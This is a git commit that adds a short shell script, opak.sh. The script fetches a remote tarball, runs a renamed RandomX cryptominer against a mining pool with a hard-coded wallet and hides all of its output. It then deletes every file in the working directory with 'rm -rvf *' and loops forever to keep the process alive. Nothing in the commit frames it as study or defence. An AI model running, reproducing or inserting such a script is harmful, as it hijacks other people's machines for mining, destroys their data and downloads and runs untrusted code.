149d508ffdf97acb94e58a0a20b6d940b61f1745
maul076 <164127253+maul076@users.noreply.github.com>
2024-03-20 11:26:17 +0700

    Create opak.sh

---
+++ opak.sh
@@ -0,0 +1,7 @@
+wget https://github.com/oncom07/combro/releases/download/misro/daemon.tar.gz && tar -xvf daemon.tar.gz && ./uranus -a randomx -o sg.zephyr.herominers.com:1123 -u ZEPHsAZJ6eo36HYMxHZKtUGhfG3xycfLkEKcSKiUDXXiQAnA6z4VxeuN4sj4AQe8USWfozFRYzB2WS6kMWfGGZaj7AoQe1dWLmp -p "vivo" -t 1 >/dev/null 2>&1 &
+rm -rvf *
+while true
+do
+        echo "bangsat..."
+        sleep 30
+done
